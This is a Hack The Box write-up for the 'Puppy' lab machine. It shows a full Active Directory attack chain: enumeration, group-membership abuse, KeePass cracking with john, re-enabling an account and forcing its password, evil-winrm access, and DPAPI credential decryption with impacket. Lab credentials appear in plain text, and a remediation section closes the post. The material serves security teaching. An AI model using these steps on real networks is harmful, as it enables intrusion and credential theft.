@@ -1,0 +1,399 @@
+---
+# heroImage: '../../../assets/posts/puppy/banner.png'
+layout: post
+description: Write-up
+postType: HTB
+pubDate:  2025-06-02
+title: "HTB Puppy"
+date: Mon Jun  2 06:26:39 PM HST 2025
+image:
+    path: ../../../assets/posts/puppy/banner.png
+    alt: puppy_banner
+# List Format
+table_of_contents:
+    - Overview
+    - Enumeration
+    - Initial Foothold
+    - Privilege Escalation
+    - Remediation
+initial_creds: "levi.james:KingofAkron2025!"
+# List Format
+ip_addresses: 
+    - 10.10.11.70
+---
+
+
+# {{ page.title }}
+
+## Table of Contents
+{% for content in page.table_of_contents %}
+ - <a href="#{{ content | downcase | replace: ' ', '-' }}">{{ content  }}</a> 
+ {% endfor %}
+
+
+
+## {{ page.table_of_contents[0] }} <a name="{{ page.table_of_contents[0] | downcase | replace: ' ', '-' }}"></a>
+**Scope**
+{% if page.ip_addresses %}
+IP Addresses:
+{% for ip in page.ip_addresses %}
+- {{ ip }}
+{% endfor %}
+{% endif %}
+{%if page.initial_creds %}
+Initial Credentials:
+- {{ page.initial_creds }}
+{% endif %}
+
+We're given some starter credentials and initial nmap scans show it to be a typical Windows Active-Directory environment, with SMB, LDAP, WINRM, etc ports open. We utilize the starter credentials to perform a bloodhound scan and this allows us to see our starter credentials is a part of the HR group which has GenericWrite access to the Develoeprs group. This gives us access to the Developers group, allowing us to read the DEV share that's present in SMB. This let's us find a keepass database file that we can crack with john, revealing a useable password for a senior dev with generic write access to a user that has WinRM access. Utilizing a force-password change we get our initial foothold. Once on the box, we do some basic enumeration and see a backups folder in the C drive which exposes a password for steph.cooper. Noticing bloodhound we see this user has an admin account so we login with this under-privileged account, look for credentials to crack with DPAPI which provide us the admin password which gives us Admin and control of the box.
+
+## {{ page.table_of_contents[1] }} <a name="{{ page.table_of_contents[0] | downcase | replace: ' ', '-' }}"></a>
+
+We're given some initial credentials, but we have to figure out where they might go, so as usual we start with nmap.
+```bash
+nmap -sCV -oA nmap/puppy -p- -vv -Pn $IP 
+
+# Nmap 7.95 scan initiated Sat May 24 21:29:18 2025 as: nmap -sCV -p- -Pn -vv -oA nmap/puppy 10.10.11.70
+Nmap scan report for 10.10.11.70
+PORT      STATE SERVICE       REASON  VERSION
+53/tcp    open  domain        syn-ack Simple DNS Plus
+88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-05-25 15:56:12Z)
+111/tcp   open  rpcbind       syn-ack 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/tcp6  rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  2,3,4        111/udp6  rpcbind
+|   100003  2,3         2049/udp   nfs
+|   100003  2,3         2049/udp6  nfs
+|   100005  1,2,3       2049/udp   mountd
+|   100005  1,2,3       2049/udp6  mountd
+|   100021  1,2,3,4     2049/tcp   nlockmgr
+|   100021  1,2,3,4     2049/tcp6  nlockmgr
+|   100021  1,2,3,4     2049/udp   nlockmgr
+|   100021  1,2,3,4     2049/udp6  nlockmgr
+|   100024  1           2049/tcp   status
+|   100024  1           2049/tcp6  status
+|   100024  1           2049/udp   status
+|_  100024  1           2049/udp6  status
+135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
+389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds? syn-ack
+464/tcp   open  kpasswd5?     syn-ack
+593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped    syn-ack
+2049/tcp  open  nlockmgr      syn-ack 1-4 (RPC #100021)
+3260/tcp  open  iscsi?        syn-ack
+3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped    syn-ack
+5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
+49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49670/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+62304/tcp open  msrpc         syn-ack Microsoft Windows RPC
+62313/tcp open  msrpc         syn-ack Microsoft Windows RPC
+62328/tcp open  msrpc         syn-ack Microsoft Windows RPC
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+|_clock-skew: 7h01m14s
+| smb2-time: 
+|   date: 2025-05-25T15:58:10
+|_  start_date: N/A
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 62785/tcp): CLEAN (Timeout)
+|   Check 2 (port 47994/tcp): CLEAN (Timeout)
+|   Check 3 (port 26380/udp): CLEAN (Timeout)
+|   Check 4 (port 46192/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat May 24 22:59:24 2025 -- 1 IP address (1 host up) scanned in 5405.90 seconds
+```
+
+We've got a lot of ports typically open for a windows-server. SMB, LDAP, and WIN-RM are the most quick for me to latch onto. So we'll be starting to explore those first and seeing how our initial credentials work.
+
+```bash
+$ nxc smb 10.10.11.70 -u levi.james -p 'KingofAkron2025!' --shares
+SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
+SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025!
+SMB         10.10.11.70     445    DC               [*] Enumerated shares
+SMB         10.10.11.70     445    DC               Share           Permissions     Remark
+SMB         10.10.11.70     445    DC               -----           -----------     ------
+SMB         10.10.11.70     445    DC               ADMIN$                          Remote Admin
+SMB         10.10.11.70     445    DC               C$                              Default share
+SMB         10.10.11.70     445    DC               DEV                             DEV-SHARE for PUPPY-DEVS
+SMB         10.10.11.70     445    DC               IPC$            READ            Remote IPC
+SMB         10.10.11.70     445    DC               NETLOGON        READ            Logon server share
+SMB         10.10.11.70     445    DC               SYSVOL          READ            Logon server share
+```
+
+There looks to be an interesting share but we don't have access. 
+I did also spider everything, using net-exec's spider-plus module, in case there was anything hiding, however it was just policies and basically empty files. But since we have verified credential access, we can at least try other alternatives.
+
+```bash
+evil-winrm -i $IP -u levi.james -p 'KingofAkron2025!'
+Evil-WinRM shell v3.7
+
+Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
+
+Error: Exiting with code 1
+```
+
+Looks like our account doesn't have WinRM access. So let's see if we can get a bloodhound scan to get a better vantage point.
+
+```bash
+nxc ldap $IP -u levi.james -p 'KingofAkron2025!' -c ALL --bloodhound
+```
+
+Import this into bloodhound and find our user levi.james.
+We can see he has some form out outbound object control... leading to write access to the developers group.
+![bloodhound_levi](../../../assets/posts/puppy/bloodhound_levi_write_dev.png)
+
+So we can follow the instructions provided under the Linux Abuse about how to leverage this write access.
+We can add levi.james to the developers group which should let us view that SMB share we could not view previously.
+
+```bash
+# Add dc.puppy.htb and puppy.htb to the /etc/hosts file
+net rpc group addmem 'Developers@puppy.htb' 'levi.james' -U 'puppy.htb\levi.james%KingofAkron2025!' -s 'dc.puppy.htb'
+# Verify
+net rpc group members 'Developers' -U 'puppy.htb\levi.james%KingofAkron2025!' -s 'dc.puppy.htb'
+
+$ smbclient '\\puppy.htb\DEV' -U 'puppy.htb\levi.james%KingofAkron2025!'
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                  DR        0  Sat Mar 22 21:07:57 2025
+  ..                                  D        0  Sat Mar  8 06:52:57 2025
+  KeePassXC-2.7.9-Win64.msi           A 34394112  Sat Mar 22 21:09:12 2025
+  Projects                            D        0  Sat Mar  8 06:53:36 2025
+  recovery.kdbx                       A     2677  Tue Mar 11 16:25:46 2025
+```
+
+
+We have a recovery.kdbx file which is for Keepass, a password manager.
+It's encrypted as we'd hope for a password manager storage but newer versions of `john` come equipped with a way to grab a crackable hash from these.
+
+I am running arch and the distro release for john is based on the last release in 2019 (Arch having old software? Crazy.), which is largely outdated and did not support this version of the kdbx storage, which is Argon-2 / Version 4.0. This version is significantly harder to generate hashes for.
+
+
+```bash
+keepass2john recovery.kdbx > recovery.hash
+john recovery.hash -w /seclist/rockyou.txt
+```
+
+This cracks and we are left with a useful password to access the file, which we can use the keepass utility.
+![keepass_creds](../../../assets/posts/puppy/keeppass_creds.png)
+
+We can take a look at our bloodhound and see all the members of the developer group and the only one with any outbound object control is Ant.Endwards, which it looks like we might have his password.
+He's a member of the senior developers group and has GenericAll over an account.
+
+![ant_to_adam_bh](../../../assets/posts/puppy/bh_ant_to_adam.png)
+
+This adam.silver account is a member of `remote management users` however the account is disabled
+We can kerberoast it, which would be the ideal method for an active account, but this is disabled, so force changing the password seems harmless. But we need to enable it, which luckily we can with our privileges.
+
+I'll make an ldif file to modify the user, but first we'd need to know the userAccountControl numbers.
+```bash
+bits=$(nxc ldap $IP -u $AUTH_USER -p $AUTH_PASSWORD --query "(&(objectCategory=person)(objectClass=user)(sAMAccountName=adam.silver))" "userAccountControl" | grep -oP 'userAccountControl +\K\d+')
+disabled_flag=2
+new_bits=$(( $bits & ~disabled_flag ))
+echo $new_bits
+# Should be 66048
+```
+
+
+```bash
+cat << EOF > adam.silver.ldif
+dn: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
+changetype: modify
+replace: userAccountControl
+userAccountControl: 66048
+EOF
+
+# modifiy adam
+ldapmodify -x -H ldap://dc.puppy.htb -D 'CN=ANTHONY J. EDWARDS,DC=PUPPY,DC=HTB' -w '<PASS>' -f 'adam.silver.ldif'
+
+# set Adam Silvers PW
+net rpc password 'adam.silver' '<NEW_PASS>' -U 'puppy.htb\ant.edwards%$<PASS>!' -S dc.puppy.htb
+```
+
+Then...
+
+```bash
+evil-winrm -i $IP -u adam.silver -p <NEW_PASS>
+```
+
+## {{ page.table_of_contents[2] }} <a name="{{ page.table_of_contents[0] | downcase | replace: ' ', '-' }}"></a>
+
+We're here on the system now. Bloodhound shows we don't have any active-directory catapults from this user, so we should enumerate the system.
+
+I initially just went to the C: drive to look for anything unique and...
+
+```powershell
+*Evil-WinRM* PS C:\> gci
+
+
+    Directory: C:\
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----          5/9/2025  10:48 AM                Backups
+d-----         5/12/2025   5:21 PM                inetpub
+d-----          5/8/2021   1:20 AM                PerfLogs
+d-r---          4/4/2025   3:40 PM                Program Files
+d-----          5/8/2021   2:40 AM                Program Files (x86)
+d-----          3/8/2025   9:00 AM                StorageReports
+d-r---          6/3/2025   2:43 AM                Users
+d-----         5/13/2025   4:40 PM                Windows
+```
+
+There's a Backups folder, inetpub, and StorageReports.
+I went straight to to the backups folder, which contained a zipped site archive
+
+```powershell
+expand-archive site-backup-2024-12-30.zip
+cd site-backup-2024-12-30/puppy
+gc nms-auth-config.xml.bak
+<?xml version="1.0" encoding="UTF-8"?>
+<ldap-config>
+    <server>
+        <host>DC.PUPPY.HTB</host>
+        <port>389</port>
+        <base-dn>dc=PUPPY,dc=HTB</base-dn>
+        <bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
+        <bind-password><**REDACTED**></bind-password>
+    </server>
+    <user-attributes>
+        <attribute name="username" ldap-attribute="uid" />
+        <attribute name="firstName" ldap-attribute="givenName" />
+        <attribute name="lastName" ldap-attribute="sn" />
+        <attribute name="email" ldap-attribute="mail" />
+    </user-attributes>
+    <group-attributes>
+        <attribute name="groupName" ldap-attribute="cn" />
+        <attribute name="groupMember" ldap-attribute="member" />
+    </group-attributes>
+    <search-filter>
+        <filter>(&(objectClass=person)(uid=%s))</filter>
+    </search-filter>
+</ldap-config>
+```
+
+And we have another potential credential.
+Looking at bloodhound, this user seems to have an admin account as well, so if this login works, it's likely going to contain some passageway to the admin credentials, at least that was my hunch.
+
+```bash
+evil-winrm -i $IP -u steph.cooper -p $PASS
+```
+
+
+## {{ page.table_of_contents[3] }} <a name="{{ page.table_of_contents[3] | downcase | replace: ' ', '-' }}"></a>
+
+
+So, because I suspected this account has the password for the the steph.cooper_adm account, I will be focusing al the enumeration on random things surrounding this account.
+
+```powershell
+gci env:
+
+gci $env:USERPROFILE -Recurse -Force # Look for anything out of the ordinary
+
+cmdkey /list
+```
+
+And I didn't see anything too useful there, so the next step was to try finding credentials in DPAPI.
+
+```powershell
+gci -Force -Recurse $env:USERPROFILE/AppData/Roaming/Microsoft/Protect | Format-List
+gci -Force -Recurse $env:USERPROFILE/AppData/Roaming/Microsoft/Credentials
+
+# Masterkey
+File:             C:\Users\steph.cooper\AppData\ROaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407
+
+# Credential
+File:             C:\Users\steph.cooper\AppData\ROaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9
+```
+
+Those two files are what we need, so we'll download them and utilize pypykatz to crack them locally.
+
+```bash
+dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password "$STEPH_COOPER_PASS"
+ Impacket v0.11.0 - Copyright 2023 Fortra
+ 
+ [MASTERKEYFILE]
+ Version     :        2 # (2)
+ Guid        : 556a2412-1275-4ccf-b721-e6a0b4f90407
+ Flags       :        0 # (0)
+ Policy      : 4ccf1275 # (1288639093)
+ MasterKeyLen: 00000088 # (136)
+ BackupKeyLen: 00000068 # (104)
+ CredHistLen : 00000000 # (0)
+ DomainKeyLen: 00000174 # (372)
+ 
+ Decrypted key with User Key (MD4 protected)
+ Decrypted key: 0xd9a5<REDACTED>0e137b7413c1414c452f9c77d6d8a8ed9efe3eca<REDACTED>9e8ba99b31cdb7abad28408d8<REDACTED>e9c84
+
+####
+dpapi.py credential -file $CREDENTIAL_FILE -key $DPAPI_MASTER_KEY 
+
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[CREDENTIAL]
+LastWritten : 2025-03-08 15:54:29
+Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
+Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
+Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
+Target      : Domain:target=PUPPY.HTB
+Description :
+Unknown     :
+Username    : steph.cooper_adm
+Unknown     : <REDACTED>
+```
+
+
+That looks perfect, let's try it out
+
+```bash
+evil-winrm -i $IP -u steph.cooder_adm -p $ADM_PASS
+```
+```powershell
+# *Evil-WinRM*  #
+PS C:\Users\steph.cooper_adm\Documents> gci C:\Users\Administrator\Desktop
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-ar---          6/2/2025   5:47 PM             34 root.txt
+```
+
+
+And it looks like we're done.
+
+
+
+## {{ page.table_of_contents[4] }} <a name="{{ page.table_of_contents[4] | downcase | replace: ' ', '-' }}"></a>
+
+Obviously the main stopper here would be ensuring our initial credentials aren't apart of the HR group that happens to have write-access to the Developers group. This would make the machine mostly secure, of course if any developer would like to try our approach they could through the keepass database. So naturally the suggestion would be to increase password complexity for the keepass database if it somehow necessary for them to exist (though I can't imagine why). Restricting permissions of Ant.Edwards would mitigate remote access from the disabled account, or you could just delete that account. 
+
+Once you're on the box however, there is open credentials available for anyone snooping inside the Backups folder and then it's trivial to get administrator access after that, as we've seen. Restriction of permissions to that folder and perhaps creating a separate account specifically for servicing the site would be more beneficial than having an administrator-adjacent account being the one to perform LDAP queries. 
+
